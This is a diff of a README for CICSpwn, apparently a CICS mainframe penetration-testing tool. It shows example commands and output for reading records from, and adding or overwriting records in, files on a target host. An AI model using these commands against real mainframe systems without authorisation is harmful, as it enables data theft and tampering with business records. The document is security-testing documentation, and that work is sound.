@@ -156,21 +156,20 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
 [+] Getting Attributes of file FILEA
 [*] File FILEA is enabled, open, and readable
 [*] Record size: 80	keylength:6
-RECORD 1
-RECORD 2
+' 000100':	START OF DATA
 ...
 ```  
 Ps: adding --num option fetches only one record
 
 ## Add a record to a file
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --add-item CUSTMAS --num 400018 --data file.txt
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --add-record FILEA --num ' 400018' --data file.txt
 [[+] Connecting to target 192.168.1.201:23
 [*] Access to CICS Terminal is possible with APPID CICS
-[*] File CUSTMAS is enabled and open
-[*] Record size: 118	keylength:6
-[+] Adding record 400018 of file CUSTMAS
-[*] item 400018 was added successfully to file CUSTMAS
+[*] File FILEA is enabled and open
+[*] Record size: 80	keylength:6
+[+] Adding record 400018 of file FILEA
+[*] Record 400018 was added successfully to file FILEA
 
 ```
 PS: if record number 400018 exists, CICSpwn updates the record automatically so please be careful.
